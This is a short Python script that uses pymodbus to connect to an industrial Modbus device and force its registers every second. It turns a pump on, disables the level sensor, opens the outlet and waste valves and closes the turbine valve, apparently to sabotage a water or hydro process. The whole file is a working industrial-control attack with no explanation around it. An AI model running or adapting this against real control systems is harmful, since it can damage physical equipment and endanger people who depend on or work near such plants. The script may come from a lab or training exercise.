#!/usr/bin/env python3

from pymodbus.client import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException
from time import sleep

target = "172.24.19.66"

client = ModbusClient(target, port=502)

try:
    client.connect()
    while True:
        client.write_register(0x01, 1)  # Feed_PUMP / Intake
        client.write_register(0x02, 0)  # Turn off Level Sensor
        client.write_register(0x03, 1)  # outlet valve open
        client.write_register(0x04, 0)  # turbine valve closed
        client.write_register(0x08, 1)  # Waste valve open
        sleep(1)

except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print("Unable to connect / Connection lost")
